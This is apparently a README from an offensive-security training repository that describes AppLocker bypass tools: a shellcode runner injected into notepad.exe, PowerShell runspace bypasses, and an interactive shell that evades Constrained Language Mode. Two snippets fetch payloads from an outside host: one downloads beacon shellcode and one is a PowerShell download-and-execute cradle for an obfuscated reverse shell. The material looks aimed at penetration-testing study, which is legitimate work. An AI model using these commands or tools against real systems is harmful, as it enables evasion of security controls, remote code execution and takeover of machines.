# ApplockerRevShell
Creates a `notepad.exe` process and runs the shellcode provided.
> [!NOTE]
> Remember to modify the shellcode URL before compiling.
> ```cs
> string shellcodeUrl = "http://192.168.45.1:80/beacons/agent.x64.bin"
> ```

# ApplockerRunspace
AppLocker runspace bypass where you can dinamically run commands with `/cmd`. Please see this [readme](https://github.com/VictorNS69/osep-material/blob/main/evasion/ApplockerBypass/ApplockerRunspace/README.md).

# BasicApplockerRunspace
Basic AppLocker runspace that runs the command you want.
> [!NOTE]
> Remember to modify the command you want to run before compiling
> ```cs
> String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.1:80/payloads/shells/obfuscate_rev.ps1') | iex";
> ```

# InteractiveApplockerRunspace
An interactive version of AppLocker runspace. This program will bind an interactive shell with CLM bypass.
